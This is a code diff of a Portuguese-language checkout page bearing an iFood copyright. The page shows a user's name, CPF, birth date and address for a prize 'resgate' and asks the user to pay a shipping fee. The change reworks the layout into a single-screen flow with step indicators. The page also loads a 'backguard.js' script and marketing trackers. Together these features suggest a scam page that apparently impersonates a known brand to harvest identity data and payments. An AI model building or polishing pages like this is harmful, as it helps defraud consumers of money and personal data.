@@ -13,7 +13,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=3.2">
+    <link rel="stylesheet" href="style.css?v=3.3">
     <script src="/backguard.js?v=1.5"></script>
     <script
       src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -44,7 +44,7 @@
     <noscript class="no-js">Para continuar, ative o JavaScript no navegador.</noscript>
 
     <main class="container">
-        <section class="step" aria-hidden="false">
+        <section class="step checkout-step" aria-hidden="false">
             <div class="step-header">
                 <span class="step-count">Resumo</span>
                 <div class="progress-bar">
@@ -52,111 +52,124 @@
                 </div>
             </div>
 
-            <h2>Resumo do pedido</h2>
-            <p>Confira seus dados antes de finalizar o resgate.</p>
+            <div class="checkout-headline">
+                <h2>Resumo do pedido</h2>
+                <p>Confirme seus dados e finalize em uma unica tela.</p>
+            </div>
 
-            <div id="summary-block">
-                <div class="summary-card">
-                    <div class="summary-row">
-                        <span>Nome</span>
-                        <strong id="summary-name">-</strong>
+            <div class="checkout-main">
+                <div class="checkout-summary-col">
+                    <div id="summary-block" class="checkout-summary-grid">
+                        <div class="summary-card">
+                            <div class="summary-row">
+                                <span>Nome</span>
+                                <strong id="summary-name">-</strong>
+                            </div>
+                            <div class="summary-row">
+                                <span>CPF</span>
+                                <strong id="summary-cpf">-</strong>
+                            </div>
+                            <div class="summary-row">
+                                <span>Nascimento</span>
+                                <strong id="summary-birth">-</strong>
+                            </div>
+                        </div>
+
+                        <div class="summary-card">
+                            <div class="summary-row">
+                                <span>Endereco</span>
+                                <strong id="summary-address">-</strong>
+                            </div>
+                            <div class="summary-row">
+                                <span>CEP</span>
+                                <strong id="summary-cep">-</strong>
+                            </div>
+                        </div>
                     </div>
-                    <div class="summary-row">
-                        <span>CPF</span>
-                        <strong id="summary-cpf">-</strong>
-                    </div>
-                    <div class="summary-row">
-                        <span>Nascimento</span>
-                        <strong id="summary-birth">-</strong>
+
+                    <div id="coupon-banner" class="coupon-banner hidden" aria-hidden="true"></div>
+
+                    <div id="shipping-total" class="summary-total hidden" aria-hidden="true">
+                        Taxa de envio: <strong>-</strong>
                     </div>
                 </div>
 
-                <div class="summary-card">
-                    <div class="summary-row">
-                        <span>Endereco</span>
-                        <strong id="summary-address">-</strong>
+                <div class="freight-card">
+                    <div id="freight-form">
+                        <div class="freight-title">Calcular frete</div>
+                        <div class="input-group">
+                            <input type="tel" id="checkout-cep" class="floating-input" placeholder=" " maxlength="9"
+                                inputmode="numeric" autocomplete="postal-code" pattern="[0-9]{5}-[0-9]{3}">
+                            <label for="checkout-cep" class="floating-label">CEP</label>
+                        </div>
+                        <button id="btn-calc-freight" class="btn-primary" type="button">Calcular frete</button>
+                        <div id="freight-loading" class="inline-loading hidden" aria-hidden="true">
+                            <div class="spinner spinner--sm" aria-hidden="true"></div>
+                            <span>Calculando frete...</span>
+                        </div>
+                        <div id="freight-address" class="freight-address hidden" aria-hidden="true">
+                            <div class="freight-address__header">
+                                <span class="freight-address__title">ENDERECO</span>
+                                <button class="freight-address__edit" id="btn-edit-cep" type="button"
+                                    aria-label="Editar CEP">
+                                    <svg viewBox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
+                                        <path
+                                            d="M3 17.25V21h3.75l11-11-3.75-3.75-11 11ZM20.7 7.05a1 1 0 0 0 0-1.4L18.35 3.3a1 1 0 0 0-1.4 0l-1.83 1.83 3.75 3.75 1.83-1.83Z">
+                                        </path>
+                                    </svg>
+                                </button>
+                            </div>
+                            <div id="freight-street" class="freight-address__street">-</div>
+                            <div id="freight-city" class="freight-address__city">-</div>
+                        </div>
                     </div>
-                    <div class="summary-row">
-                        <span>CEP</span>
-                        <strong id="summary-cep">-</strong>
-                    </div>
+
+                    <div id="freight-hint" class="freight-hint hidden" aria-hidden="true">Selecione o frete abaixo</div>
+                    <div id="freight-options" class="freight-options hidden" aria-hidden="true"></div>
                 </div>
             </div>
 
-            <div id="coupon-banner" class="coupon-banner hidden" aria-hidden="true"></div>
-
-            <div class="freight-card">
-                <div id="freight-form">
-                    <div class="freight-title">Calcular frete</div>
-                    <div class="input-group">
-                        <input type="tel" id="checkout-cep" class="floating-input" placeholder=" " maxlength="9"
-                            inputmode="numeric" autocomplete="postal-code" pattern="[0-9]{5}-[0-9]{3}">
-                        <label for="checkout-cep" class="floating-label">CEP</label>
+            <div class="checkout-action-panel">
+                <div class="checkout-flow" aria-label="Etapas do checkout">
+                    <div id="checkout-step-cep" class="checkout-flow__item">
+                        <span class="checkout-flow__index">1</span>
+                        <div>
+                            <strong>CEP</strong>
+                            <small>Confirme o local</small>
+                        </div>
                     </div>
-                    <button id="btn-calc-freight" class="btn-primary" type="button">Calcular frete</button>
-                    <div id="freight-loading" class="inline-loading hidden" aria-hidden="true">
-                        <div class="spinner spinner--sm" aria-hidden="true"></div>
-                        <span>Calculando frete...</span>
+                    <div id="checkout-step-frete" class="checkout-flow__item">
+                        <span class="checkout-flow__index">2</span>
+                        <div>
+                            <strong>Frete</strong>
+                            <small>Opcao ideal</small>
+                        </div>
                     </div>
-                    <div id="freight-address" class="freight-address hidden" aria-hidden="true">
-                        <div class="freight-address__header">
-                            <span class="freight-address__title">ENDERECO</span>
-                            <button class="freight-address__edit" id="btn-edit-cep" type="button"
-                                aria-label="Editar CEP">
-                                <svg viewBox="0 0 24 24" role="img" focusable="false" aria-hidden="true">
-                                    <path
-                                        d="M3 17.25V21h3.75l11-11-3.75-3.75-11 11ZM20.7 7.05a1 1 0 0 0 0-1.4L18.35 3.3a1 1 0 0 0-1.4 0l-1.83 1.83 3.75 3.75 1.83-1.83Z">
-                                    </path>
-                                </svg>
-                            </button>
+                    <div id="checkout-step-final" class="checkout-flow__item">
+                        <span class="checkout-flow__index">3</span>
+                        <div>
+                            <strong>Finalizar</strong>
+                            <small>Gerar pagamento</small>
                         </div>
-                        <div id="freight-street" class="freight-address__street">-</div>
-                        <div id="freight-city" class="freight-address__city">-</div>
-                    </div>
-                    <div id="freight-details" class="freight-details hidden" aria-hidden="true">
-                        <div class="input-group">
-                            <input type="text" id="addr-number" class="floating-input" placeholder=" ">
-                            <label for="addr-number" class="floating-label">Numero *</label>
-                        </div>
-                        <label class="checkline">
-                            <input type="checkbox" id="no-number">
-                            <span>Endereco sem numero</span>
-                        </label>
-
-                        <div class="input-group">
-                            <input type="text" id="addr-complement" class="floating-input" placeholder=" ">
-                            <label for="addr-complement" class="floating-label">Complemento *</label>
-                        </div>
-                        <label class="checkline">
-                            <input type="checkbox" id="no-complement">
-                            <span>Endereco sem complemento</span>
-                        </label>
-
-                        <div class="input-group">
-                            <input type="text" id="addr-reference" class="floating-input" placeholder=" ">
-                            <label for="addr-reference" class="floating-label">Ponto de referencia (opcional)</label>
-                        </div>
-
-                        <button id="btn-verify-freight" class="btn-primary" type="button">
-                            Verificar fretes
-                        </button>
                     </div>
                 </div>
 
-                <div id="freight-hint" class="freight-hint hidden" aria-hidden="true">Selecione o frete abaixo</div>
-                <div id="freight-options" class="freight-options hidden" aria-hidden="true"></div>
-                <div id="shipping-total" class="summary-total hidden" aria-hidden="true">
-                    Taxa de envio: <strong>-</strong>
+                <div class="checkout-action-panel__top">
+                    <span class="checkout-action-label">Proximo passo</span>
+                    <strong id="checkout-next-step">Informe seu CEP para liberar as opcoes de frete.</strong>
+                    <span id="checkout-selected-shipping" class="checkout-selected-shipping">Frete ainda nao selecionado.</span>
                 </div>
-            </div>
 
-            <div class="action-stack">
-                <button id="btn-finish" class="btn-primary hidden" type="button">Finalizar pedido</button>
-                <a class="btn-secondary" href="dados?return=checkout">Editar dados</a>
-                <a class="btn-secondary" href="endereco?return=checkout">Editar endereco</a>
-            </div>
+                <div class="action-stack action-stack--soft">
+                    <button id="btn-finish" class="btn-primary hidden" type="button">Finalizar pedido</button>
+                    <div class="checkout-edit-links">
+                        <a class="btn-secondary" href="dados?return=checkout">Editar dados</a>
+                        <a class="btn-secondary" href="endereco?return=checkout">Editar endereco</a>
+                    </div>
+                </div>
 
-            <p class="small-text">* O pagamento do frete e processado em ambiente seguro.</p>
+                <p class="checkout-security">Pagamento do frete processado em ambiente seguro.</p>
+            </div>
         </section>
     </main>
 
@@ -166,7 +179,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=7.3" defer></script>
+    <script src="script.js?v=7.4" defer></script>
 </body>
 
 </html>
